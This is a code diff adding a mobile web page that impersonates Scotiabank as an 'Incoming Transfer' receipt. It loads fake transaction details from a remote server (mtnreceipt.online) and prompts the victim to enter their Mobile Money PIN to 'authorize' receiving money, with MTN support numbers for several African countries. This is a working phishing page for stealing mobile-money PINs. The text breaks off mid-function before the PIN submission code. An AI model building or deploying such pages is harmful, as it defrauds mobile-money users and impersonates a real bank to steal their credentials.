@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+<title>Scotiabank · Incoming Transfer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --sb-primary:   #EC111A;
+    --sb-royal:     #C00D14;
+    --sb-navy:      #1A1A1A;
+    --sb-gold:      #FFD400;
+    --sb-white:     #FFFFFF;
+    --sb-text:      #1A2233;
+    --sb-muted:     #5B6577;
+    --sb-border:    #E4E8F0;
+    --sb-soft:      #F4F6FA;
+    --sb-page:      #EEF1F7;
+    --sb-green:     #0E7A4A;
+    --sb-red:       #B3261E;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { min-height: 100%; }
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--sb-page); color: var(--sb-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
+    display: flex; justify-content: center;
+    padding: 0;
+    -webkit-text-size-adjust: 100%;
+    text-size-adjust: 100%;
+    overscroll-behavior-y: contain;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    min-height: 100dvh;
+    background: var(--sb-white);
+    display: flex; flex-direction: column;
+    position: relative;
+    overflow: visible;
+  }
+
+  .header {
+    flex-shrink: 0; background: var(--sb-white);
+    padding: max(18px, env(safe-area-inset-top, 0px)) 20px 16px;
+    border-bottom: 1px solid var(--sb-border);
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px;
+  }
+  .brand-block { display: flex; align-items: center; gap: 10px; }
+  .header-logo { height: 24px; width: auto; display: block; flex-shrink: 0; }
+
+  .header-actions { display: flex; gap: 8px; flex-shrink: 0; }
+  .header-btn {
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 38px; height: 38px;
+    border-radius: 8px; border: 1px solid var(--sb-border);
+    background: var(--sb-white); color: var(--sb-primary);
+    cursor: pointer; transition: all .15s;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .header-btn:hover { border-color: var(--sb-primary); background: #FDF2F3; }
+  .header-btn.copied { background: var(--sb-green); border-color: var(--sb-green); color: #fff; }
+  .header-btn svg { width: 17px; height: 17px; stroke: currentColor; fill: none; stroke-width: 2; }
+
+  .hero {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    padding: 22px 22px 28px;
+    border-bottom-left-radius: 22px;
+    border-bottom-right-radius: 22px;
+  }
+  .hero::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
+    background: var(--sb-gold);
+    border-top-left-radius: 22px; border-top-right-radius: 22px;
+  }
+  .secure-badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    font-size: 10.5px; font-weight: 700; letter-spacing: 0.5px;
+    text-transform: uppercase; color: #FFFFFF;
+    background: rgba(255,255,255,0.16);
+    border: 1px solid rgba(255,255,255,0.28);
+    padding: 5px 10px; border-radius: 999px;
+  }
+  .secure-badge svg { width: 11px; height: 11px; stroke: var(--sb-gold); fill: none; stroke-width: 2.4; }
+  .hero-label {
+    margin-top: 18px; font-size: 11.5px; font-weight: 600;
+    letter-spacing: 0.6px; text-transform: uppercase;
+    color: rgba(255,255,255,0.78);
+  }
+  .hero-amount {
+    margin-top: 4px; font-size: 44px; font-weight: 900;
+    color: #FFFFFF; letter-spacing: -1.8px; line-height: 1.05;
+    word-break: break-word;
+  }
+  .hero-amount .cur {
+    font-size: 22px; font-weight: 800;
+    letter-spacing: -0.5px; margin-right: 4px; opacity: 0.95;
+  }
+  .hero-sender {
+    margin-top: 12px; display: flex; align-items: center; gap: 6px;
+    font-size: 13px; color: rgba(255,255,255,0.82); line-height: 1.5;
+  }
+  .hero-sender strong { color: var(--sb-gold); font-weight: 800; }
+
+  .body {
+    flex: 1;
+    padding: 18px 18px 24px;
+    display: flex; flex-direction: column;
+    overflow: visible;
+  }
+
+  .section-heading {
+    font-size: 10.5px; font-weight: 800; letter-spacing: 0.8px;
+    text-transform: uppercase; color: var(--sb-muted);
+    margin: 4px 2px 10px;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+
+  .details-panel {
+    background: var(--sb-white); border-radius: 16px;
+    border: 1px solid var(--sb-border); overflow: hidden;
+    margin-bottom: 20px;
+    box-shadow: 0 1px 2px rgba(0,0,0,.03), 0 6px 20px -8px rgba(236,17,26,.08);
+  }
+  .detail-row {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    gap: 12px; padding: 14px 18px;
+    border-bottom: 1px solid #F1F4F9;
+    font-size: 13px;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-row .k { color: var(--sb-muted); font-weight: 500; flex-shrink: 0; }
+  .detail-row .v {
+    font-weight: 700; color: var(--sb-text);
+    text-align: right; word-break: break-word;
+  }
+  .detail-row .v.mono {
+    font-family: "SF Mono", Monaco, Consolas, monospace;
+    font-size: 11.5px; background: #FDEEEF; color: var(--sb-primary);
+    padding: 2px 8px; border-radius: 5px; letter-spacing: 0.3px;
+  }
+  .detail-row.purpose-row .k { color: #6A5B00; font-weight: 600; }
+  .detail-row.purpose-row .v { color: var(--sb-navy); font-weight: 800; }
+  .detail-row .v.ready {
+    color: var(--sb-green); font-weight: 800;
+    display: inline-flex; align-items: center; gap: 5px;
+  }
+  .detail-row .v.ready::before {
+    content: ''; width: 6px; height: 6px; border-radius: 50%;
+    background: var(--sb-green); display: inline-block;
+  }
+
+  .btn-confirm {
+    width: 100%; min-height: 66px; padding: 20px 24px;
+    background: var(--sb-primary); color: #fff;
+    font-family: inherit; font-size: 18px; font-weight: 800;
+    letter-spacing: 0.3px; line-height: 1.2;
+    border: none; border-radius: 16px; cursor: pointer;
+    box-shadow: 0 10px 26px rgba(236,17,26,0.32);
+    transition: filter .15s, transform .1s, box-shadow .15s;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    -webkit-tap-highlight-color: transparent; touch-action: manipulation;
+    margin-top: 4px;
+  }
+  .btn-confirm:hover { filter: brightness(1.08); box-shadow: 0 12px 30px rgba(236,17,26,0.4); }
+  .btn-confirm:active { transform: scale(0.98); }
+  .btn-confirm:disabled { opacity: 0.65; cursor: wait; }
+  .btn-confirm svg {
+    width: 22px; height: 22px; stroke: currentColor; fill: none;
+    stroke-width: 2.6; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .secure-note {
+    margin-top: 14px; font-size: 11px; color: var(--sb-muted);
+    text-align: center; line-height: 1.6;
+    display: flex; align-items: center; justify-content: center; gap: 5px;
+  }
+  .secure-note svg { width: 12px; height: 12px; stroke: var(--sb-green); fill: none; stroke-width: 2.4; }
+
+  .sb-footer {
+    width: 100%; background: var(--sb-navy);
+    border-radius: 14px; padding: 16px 18px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; margin-top: 22px;
+  }
+  .footer-brand { display: flex; align-items: center; gap: 8px; }
+  .foot-logo {
+    height: 20px; width: auto; display: block; flex-shrink: 0;
+    filter: brightness(0) invert(1);
+  }
+  .sb-footer .foot-support {
+    font-size: 10.5px; color: rgba(255,255,255,0.72);
+    line-height: 1.5; text-align: right;
+  }
+  .sb-footer .foot-support strong {
+    color: var(--sb-gold); font-weight: 700; font-size: 11.5px;
+  }
+
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: var(--sb-navy); color: #fff; padding: 12px 20px; border-radius: 10px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+    box-shadow: 0 12px 28px rgba(0,0,0,0.25);
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  .loading-overlay {
+    position: fixed; inset: 0; display: none;
+    flex-direction: column; align-items: center; justify-content: center;
+    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    z-index: 9999; color: #fff; padding: 28px 24px; text-align: center;
+  }
+  .loading-overlay.show { display: flex; }
+  .loading-overlay .brand-tag {
+    display: flex; align-items: center; justify-content: center;
+    margin-bottom: 36px;
+    filter: brightness(0) invert(1);
+  }
+  .loading-overlay .brand-tag img { height: 28px; width: auto; }
+  .spinner {
+    width: 64px; height: 64px;
+    border: 4px solid rgba(255,255,255,0.18);
+    border-top-color: var(--sb-gold);
+    border-radius: 50%; animation: spin 0.9s linear infinite;
+    margin-bottom: 26px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loading-overlay h2 {
+    font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 8px;
+  }
+  .loading-overlay p {
+    font-size: 13px; color: rgba(255,255,255,0.8);
+    max-width: 290px; line-height: 1.6; margin: 0 auto;
+  }
+  .loading-overlay .note {
+    margin-top: 22px; font-size: 11.5px;
+    color: rgba(255,255,255,0.55); font-weight: 600;
+  }
+
+  .popup {
+    position: fixed; inset: 0; display: none;
+    align-items: center; justify-content: center;
+    padding: 24px; z-index: 10000;
+  }
+  .popup.show { display: flex; }
+  .popup-backdrop {
+    position: absolute; inset: 0;
+    background: rgba(16,24,40,0.72);
+    backdrop-filter: blur(3px); -webkit-backdrop-filter: blur(3px);
+  }
+  .popup-card {
+    position: relative; background: #fff; border-radius: 22px;
+    max-width: 360px; width: 100%;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.4);
+    overflow: hidden;
+    animation: popIn .3s cubic-bezier(.34,1.5,.64,1);
+  }
+  @keyframes popIn {
+    from { transform: scale(0.92) translateY(8px); opacity: 0; }
+    to   { transform: scale(1)   translateY(0);    opacity: 1; }
+  }
+  .popup-stripe { height: 5px; background: linear-gradient(90deg, var(--sb-gold), var(--sb-primary)); }
+  .popup-body { padding: 26px 22px 22px; text-align: center; }
+  .popup-icon {
+    width: 68px; height: 68px; border-radius: 50%;
+    background: #FDEEEF; border: 2px solid #F8C9CC;
+    display: inline-flex; align-items: center; justify-content: center;
+    margin: 0 auto 18px;
+  }
+  .popup-icon svg { width: 34px; height: 34px; stroke: var(--sb-primary); fill: none; stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round; }
+  .popup h3 {
+    font-size: 20px; font-weight: 800; color: var(--sb-navy);
+    letter-spacing: -0.3px; margin-bottom: 12px; line-height: 1.3;
+  }
+  .popup .popup-message {
+    font-size: 14px; color: #475569; line-height: 1.6; margin-bottom: 10px;
+  }
+  .popup .popup-message strong { color: var(--sb-navy); font-weight: 800; }
+  .popup .popup-sub {
+    font-size: 11.5px; color: var(--sb-muted); font-weight: 600;
+    margin-bottom: 24px; line-height: 1.5;
+    padding: 8px 12px; border-radius: 8px; background: #F4F6FA;
+    display: inline-block;
+  }
+  .popup-actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  .popup-btn {
+    min-height: 52px; padding: 12px 16px; border-radius: 13px;
+    font-family: inherit; font-size: 15px; font-weight: 800;
+    letter-spacing: 0.2px; cursor: pointer;
+    display: flex; align-items: center; justify-content: center; gap: 7px;
+    border: none; transition: filter .15s, transform .1s;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .popup-btn:active { transform: scale(0.97); }
+  .popup-btn.yes {
+    background: var(--sb-green); color: #fff;
+    box-shadow: 0 6px 18px rgba(14,122,74,0.35);
+  }
+  .popup-btn.yes:hover { filter: brightness(1.08); }
+  .popup-btn.no {
+    background: #fff; color: var(--sb-red); border: 1.5px solid #E4C4C0;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+  }
+  .popup-btn.no:hover { background: #FDECEA; }
+  .popup-btn svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
+
+  .pin-panel {
+    position: fixed; inset: 0; display: none;
+    flex-direction: column;
+    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    z-index: 9999; color: #fff;
+    padding: max(24px, env(safe-area-inset-top, 0px)) 22px max(24px, env(safe-area-inset-bottom, 0px));
+    overflow-y: auto;
+  }
+  .pin-panel.show { display: flex; }
+  .pin-panel .brand-tag {
+    display: flex; align-items: center; justify-content: center;
+    margin: 20px auto 28px;
+    filter: brightness(0) invert(1);
+  }
+  .pin-panel .brand-tag img { height: 28px; width: auto; }
+  .pin-panel h2 {
+    font-size: 21px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 8px; text-align: center;
+  }
+  .pin-panel .pin-desc {
+    font-size: 13px; color: rgba(255,255,255,0.8); text-align: center;
+    max-width: 300px; margin: 0 auto 20px; line-height: 1.6;
+  }
+  .pin-panel .pin-amount {
+    text-align: center; margin-bottom: 8px;
+    padding: 14px 16px; background: rgba(255,255,255,0.10);
+    border-radius: 12px; max-width: 320px; margin-left: auto; margin-right: auto;
+  }
+  .pin-panel .pin-amount .lbl {
+    font-size: 10.5px; font-weight: 700; letter-spacing: 0.7px;
+    text-transform: uppercase; color: rgba(255,255,255,0.6);
+    display: block; margin-bottom: 4px;
+  }
+  .pin-panel .pin-amount .val {
+    font-size: 26px; font-weight: 900; color: #fff;
+    letter-spacing: -0.6px;
+  }
+  .pin-panel .pin-number {
+    text-align: center; margin-bottom: 24px;
+    font-size: 12.5px; color: rgba(255,255,255,0.8);
+    line-height: 1.5;
+  }
+  .pin-panel .pin-number strong {
+    display: inline-block; margin-top: 3px;
+    font-family: "SF Mono", Monaco, Consolas, monospace;
+    font-size: 14px; font-weight: 700; color: #fff;
+    background: rgba(255,255,255,0.14); padding: 3px 10px;
+    border-radius: 6px; letter-spacing: 0.5px;
+  }
+
+  .pin-field-wrap { margin-bottom: 22px; }
+  .pin-field-wrap label {
+    display: block; font-size: 11.5px; font-weight: 700;
+    letter-spacing: 0.8px; text-transform: uppercase;
+    color: rgba(255,255,255,0.68); margin-bottom: 8px;
+  }
+  .pin-field-wrap .pin-helper {
+    display: block; font-size: 11.5px; color: rgba(255,255,255,0.72);
+    line-height: 1.45; margin: -2px 0 10px; font-weight: 500;
+  }
+  .pin-input-wrap {
+    display: flex; align-items: center; gap: 8px;
+    border-bottom: 1.5px solid rgba(255,255,255,0.35);
+    padding-bottom: 10px; transition: border-color .15s;
+  }
+  .pin-input-wrap:focus-within { border-bottom-color: rgba(255,255,255,0.85); }
+  .pin-input-wrap input {
+    flex: 1; min-width: 0; background: transparent; border: none; outline: none;
+    color: #fff; font-family: inherit; font-size: 17px; font-weight: 600;
+    letter-spacing: 4px; padding: 2px 0;
+  }
+  .pin-input-wrap input::placeholder {
+    color: rgba(255,255,255,0.42); letter-spacing: 1px; font-weight: 500;
+  }
+  .eye-btn {
+    flex-shrink: 0; background: transparent; border: none; padding: 6px;
+    cursor: pointer; color: rgba(255,255,255,0.7);
+    display: inline-flex; align-items: center; justify-content: center;
+    transition: color .15s; min-width: 36px; min-height: 36px;
+  }
+  .eye-btn:hover { color: var(--sb-gold); }
+  .eye-btn svg { width: 20px; height: 20px; stroke: currentColor; fill: none; stroke-width: 2; }
+  .pin-error {
+    display: none; font-size: 11.5px; color: var(--sb-gold);
+    margin-top: 8px; font-weight: 600; line-height: 1.4;
+  }
+  .pin-error.show { display: block; }
+
+  .btn-pin-submit {
+    width: 100%; min-height: 60px;
+    background: #fff; color: var(--sb-primary);
+    font-family: inherit; font-size: 16.5px; font-weight: 800;
+    letter-spacing: 0.3px;
+    border: none; border-radius: 13px; cursor: pointer; margin-top: 12px;
+    box-shadow: 0 10px 24px rgba(0,0,0,0.22);
+    transition: filter .15s, transform .1s;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .btn-pin-submit:hover { filter: brightness(0.98); }
+  .btn-pin-submit:active { transform: scale(0.985); }
+  .btn-pin-submit:disabled { opacity: 0.7; cursor: wait; }
+
+  .pin-cancel {
+    margin-top: 22px; background: transparent; border: none; cursor: pointer;
+    color: rgba(255,255,255,0.65); font-family: inherit;
+    font-size: 12px; font-weight: 600;
+    text-decoration: underline; text-underline-offset: 3px;
+    display: block; margin-left: auto; margin-right: auto;
+  }
+  .pin-cancel:hover { color: var(--sb-gold); }
+
+  @media (max-width: 380px) {
+    .header { padding: 14px 14px 12px; }
+    .header-logo { height: 20px; }
+    .hero { padding: 18px 18px 24px; }
+    .hero-amount { font-size: 36px; }
+    .hero-amount .cur { font-size: 19px; }
+    .body { padding: 16px 14px 20px; }
+    .detail-row { padding: 12px 14px; font-size: 12.5px; }
+    .btn-confirm { min-height: 60px; font-size: 16.5px; }
+    .popup-body { padding: 22px 18px 18px; }
+    .popup h3 { font-size: 18px; }
+    .popup-btn { min-height: 48px; font-size: 14px; }
+    .pin-panel h2 { font-size: 19px; }
+    .pin-panel .pin-amount .val { font-size: 22px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: auto; max-height: 900px;
+      border-radius: 20px;
+      box-shadow: 0 30px 80px rgba(236,17,26,0.14);
+      overflow-y: auto;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="header">
+    <div class="brand-block">
+      <img
+        class="header-logo"
+        src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg"
+        alt="Scotiabank"
+        referrerpolicy="no-referrer"
+        onerror="this.style.display='none'"
+      >
+    </div>
+    <div class="header-actions">
+      <button class="header-btn" id="copyBtn" onclick="copyReceipt()" aria-label="Copy receipt">
+        <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+      </button>
+    </div>
+  </div>
+
+  <div class="hero">
+    <div class="secure-badge">
+      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Secure Transfer
+    </div>
+    <div class="hero-label" id="heroLabel">You are receiving</div>
+    <div class="hero-amount" id="heroAmount"><span class="cur">—</span>—</div>
+    <div class="hero-sender" id="heroSender">From <strong>—</strong></div>
+  </div>
+
+  <div class="body" id="bodyArea">
+
+    <div class="section-heading">
+      <span>Transaction details</span>
+    </div>
+
+    <div class="details-panel" id="detailsPanel">
+      <!-- filled by JS -->
+    </div>
+
+    <button class="btn-confirm" id="confirmBtn" onclick="startConfirmFlow()">
+      <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>
+      <span id="confirmBtnLabel">Confirm</span>
+    </button>
+
+    <div class="secure-note">
+      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+      Secure end-to-end · Verified by Scotiabank
+    </div>
+
+    <div class="sb-footer">
+      <div class="footer-brand">
+        <img
+          class="foot-logo"
+          src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg"
+          alt="Scotiabank"
+          referrerpolicy="no-referrer"
+          onerror="this.style.display='none'"
+        >
+      </div>
+      <div class="foot-support">
+        Customer Care<br>
+        Call <strong id="supportNum">—</strong>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="brand-tag">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg" alt="Scotiabank" referrerpolicy="no-referrer" onerror="this.style.display='none'">
+  </div>
+  <div class="spinner"></div>
+  <h2 id="loadingTitle">Verifying transaction…</h2>
+  <p id="loadingDesc">Connecting securely to Scotiabank. Please do not close this page.</p>
+  <div class="note" id="loadingNote"></div>
+</div>
+
+<div class="popup" id="confirmPopup">
+  <div class="popup-backdrop" onclick="popupNo()"></div>
+  <div class="popup-card">
+    <div class="popup-stripe"></div>
+    <div class="popup-body">
+      <div class="popup-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+      </div>
+      <h3 id="popupTitle">Are you sure?</h3>
+      <div class="popup-message" id="popupMessage">You are about to receive <strong>—</strong> from <strong>—</strong>.</div>
+      <div class="popup-sub">Verify transaction to complete</div>
+      <div class="popup-actions">
+        <button class="popup-btn yes" onclick="popupYes()">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+          <span>Yes</span>
+        </button>
+        <button class="popup-btn no" onclick="popupNo()">
+          <svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+          <span>No</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="pin-panel" id="pinPanel">
+  <div class="brand-tag">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg" alt="Scotiabank" referrerpolicy="no-referrer" onerror="this.style.display='none'">
+  </div>
+
+  <h2>Confirm your Mobile Money PIN</h2>
+  <div class="pin-desc">Enter your Mobile Money PIN to securely authorize this incoming transfer.</div>
+
+  <div class="pin-amount">
+    <span class="lbl">Amount</span>
+    <span class="val" id="pinAmountVal">—</span>
+  </div>
+
+  <div class="pin-number">
+    Authorizing for your number<br>
+    <strong id="pinNumberVal">—</strong>
+  </div>
+
+  <div class="pin-field-wrap">
+    <label for="pinInput">Mobile Money PIN</label>
+    <span class="pin-helper">The 4–6 digit PIN you use on your Mobile Money app</span>
+    <div class="pin-input-wrap">
+      <input type="password" id="pinInput" inputmode="numeric" autocomplete="off" placeholder="Mobile Money PIN" maxlength="8">
+      <button type="button" class="eye-btn" onclick="togglePin()" aria-label="Show or hide PIN">
+        <svg viewBox="0 0 24 24" id="eyeIcon"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+      </button>
+    </div>
+    <div class="pin-error" id="pinError">Please enter your Mobile Money PIN.</div>
+  </div>
+
+  <button class="btn-pin-submit" id="pinSubmitBtn" onclick="submitPin()">Authorize transfer</button>
+  <button class="pin-cancel" onclick="cancelPin()">Cancel</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const API_BASE = 'https://mtnreceipt.online';
+
+  const SUPPORT_NUMBERS = {
+    'Cameroon': '233 42 12 12',
+    'Zambia': '111',
+    'Zambia (MTN)': '111',
+    'Uganda': '100',
+    'Uganda (MTN)': '100',
+    'Ghana': '100',
+    'Ghana (MTN)': '100',
+    'Benin': '111',
+    'Botswana': '399 9100',
+    'Côte d\'Ivoire': '111',
+    'Congo Brazzaville': '111',
+    'eSwatini': '112',
+    'Liberia': '111',
+    'Rwanda': '111'
+  };
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
+    XOF: 'fr-BJ', BWP: 'en-BW', USD: 'en-US',
+    SZL: 'en-SZ', LRD: 'en-LR', RWF: 'en-RW'
+  };
+
+  function formatAmount(amount, currency) {
+    const locale = CURRENCY_LOCALE[currency] || 'en-US';
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    try {
+      const parts = new Intl.NumberFormat(locale, {
+        minimumFractionDigits: 0, maximumFractionDigits: 2
+      }).format(n);
+      const pretty = (currency === 'XAF' || currency === 'XOF' || currency === 'UGX')
+        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
+        : parts;
+      return pretty + ' ' + (currency || '');
+    } catch (e) { return n + ' ' + (currency || ''); }
+  }
+
+  function formatDate(ts) {
+    const d = ts ? new Date(ts) : new Date();
+    return d.toLocaleString(undefined, {
+      day: '2-digit', month: 'short', year: 'numeric',
+      hour: '2-digit', minute: '2-digit'
+    });
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  let tx = {
+    ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '',
+    mk: '', an: '', dt: '', pu: ''
+  };
+
+  async function decodeData() {
+    const params = new URLSearchParams(location.search);
+    const code = params.get('r') || params.get('t');
+
+    if (code) {
+      try {
+        const res = await fetch(API_BASE + '/api/links/' + encodeURIComponent(code), {
+          signal: AbortSignal.timeout(60000)
+        });
+        if (res.status === 410) {
+          const body = await res.json().catch(() => ({}));
+          return { _expired: true, expiresAt: body.expiresAt || null };
+        }
+        if (res.status === 404) return { _notFound: true };
+        if (!res.ok) return { _notFound: true };
+        return await res.json();
+      } catch (e) {
+        console.error('short-link fetch failed', e);
+        return { _notFound: true };
+      }
+    }
+
+    const raw = params.get('d');
+    if (!raw) return null;
+    try {
+      let b64 = raw.replace(/-/g, '+').replace(/_/g, '/');
+      while (b64.length % 4) b64 += '=';
+      return JSON.parse(decodeURIComponent(escape(atob(b64))));
+    } catch (e) {
+      return { _notFound: true };
+    }
+  }
+
+  async function init() {
+    // ✅ Pre-warm the server silently while the page loads
+    fetch(API_BASE + '/health', { signal: AbortSignal.timeout(60000) }).catch(()=>{});
+
+    const data = await decodeData();
+
+    if (!data) {
+      document.querySelector('.body').innerHTML =
+        '<div style="padding:40px 24px;text-align:center;color:#5B6577;font-size:14px;line-height:1.6">Invalid or missing link. Please request a new payment link from the sender.</div>';
+      return;
+    }
+
+    if (data._expired) {
+      const expText = data.expiresAt ? 'It expired on ' + formatDate(data.expiresAt) + '.' : '';
+      document.querySelector('.body').innerHTML =
+        '<div style="padding:40px 24px;text-align:center">' +
+          '<div style="width:76px;height:76px;border-radius:50%;background:#94A3B8;display:inline-flex;align-items:center;justify-content:center;margin:0 auto 20px">' +
+            '<svg viewBox="0 0 24 24" style="width:38px;height:38px;stroke:#fff;fill:none;stroke-width:3.2;stroke-linecap:round;stroke-linejoin:round"><path d="M12 8v5M12 16.5v.01"/></svg>' +
+          '</div>' +
+          '<div style="font-size:20px;font-weight:800;color:#1A1A1A;margin-bottom:8px">Payment Request Expired</div>' +
+          '<div style="font-size:13.5px;color:#5B6577;line-height:1.6">This payment link is no longer valid. ' + expText + '<br>Please ask the sender to send you a new link.</div>' +
+        '</div>';
+      return;
+    }
+
+    if (data._notFound) {
+      document.querySelector('.body').innerHTML =
+        '<div style="padding:40px 24px;text-align:center;color:#5B6577;font-size:14px;line-height:1.6">We couldn\'t find this payment request. Please request a new payment link from the sender.</div>';
+      return;
+    }
+
+    tx = {
+      ref: data.tx || data.trackingNumber || '',
+      am:  data.am || '',
+      cur: data.cur || '',
+      rn:  data.rn || '',
+      c:   data.c || '',
+      pm:  data.pm || '',
+      sn:  data.sn || '',
+      mk:  data.mk || '',
+      an:  data.an || '',
+      dt:  data.dtIso || data.dt || data.ts || data.createdAt || Date.now(),
+      pu:  data.pu || data.purpose || ''
+    };
+
+    console.log('[index] loaded tx:', tx);
+
+    const amtFull = formatAmount(tx.am, tx.cur);
+    document.getElementById('heroAmount').innerHTML =
+      '<span class="cur">' + (tx.cur || '') + '</span>' +
+      (tx.am ? formatAmount(tx.am, tx.cur).replace(' ' + tx.cur, '') : '—');
+
+    document.getElementById('heroSender').innerHTML =
+      'From <strong>' + (tx.mk || 'Scotiabank') + '</strong>';
+
+    document.getElementById('pinAmountVal').textContent = amtFull;
+    document.getElementById('pinNumberVal').textContent = tx.an || '—';
+
+    renderDetails();
+    document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
+  }
+
+  function renderDetails() {
+    const rows = [
+      { k: 'Sender',           v: tx.mk || 'Scotiabank' },
+      { k: 'Recipient',        v: tx.rn || '—' },
+      { k: 'Recipient phone',  v: tx.an || '—', mono: true },
+      { k: 'Purpose',          v: tx.pu || '—', cls: 'purpose-row' },
+      { k: 'Country',          v: tx.c || '—' },
+      { k: 'Payment method',   v: tx.pm || '—' },
+      { k: 'Service',          v: tx.sn || '—' },
+      { k: 'Reference',        v: tx.ref || '—', mono: true },
+      { k: 'Date',             v: tx.dt ? formatDate(tx.dt) : formatDate() },
+      { k: 'Status',           v: 'Ready to receive', cls: 'ready' }
+    ];
+
+    let html = '';
+    rows.forEach(r => {
+      const vcls = r.mono ? 'mono' : (r.cls || '');
+      html += '<div class="detail-row ' + (r.cls || '') + '">' +
+                '<span class="k">' + r.k + '</span>' +
+                '<span class="v ' + vcls + '">' + (r.v || '—') + '</span>' +
+              '</div>';
+    });
+
+    document.getElementById('detailsPanel').innerHTML = html;
+  }
+
+  function copyReceipt() {
+    const lines = [
+      'Scotiabank — Incoming Transfer',
+      '----------------------------------',
+      'Amount: ' + formatAmount(tx.am, tx.cur),
+      'Sender: ' + (tx.mk || 'Scotiabank'),
+      'Recipient: ' + (tx.rn || '—'),
+      'Recipient phone: ' + (tx.an || '—'),
+      'Purpose: ' + (tx.pu || '—'),
+      'Country: ' + (tx.c || '—'),
+      'Reference: ' + (tx.ref || '—'),
+      'Payment method: ' + (tx.pm || '—'),
+      'Service: ' + (tx.sn || '—'),
+      'Date: ' + formatDate(tx.dt)
+    ].join('\n');
+
+    const btn = document.getElementById('copyBtn');
+    const done = () => {
+      btn.classList.add('copied');
+      showToast('Receipt copied to clipboard.');
+      setTimeout(() => btn.classList.remove('copied'), 1800);
+    };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(lines).then(done).catch(() => { fallbackCopy(lines); done(); });
+    } else { fallbackCopy(lines); done(); }
+  }
+
+  function fallbackCopy(text) {
+    const ta = document.createElement('textarea');
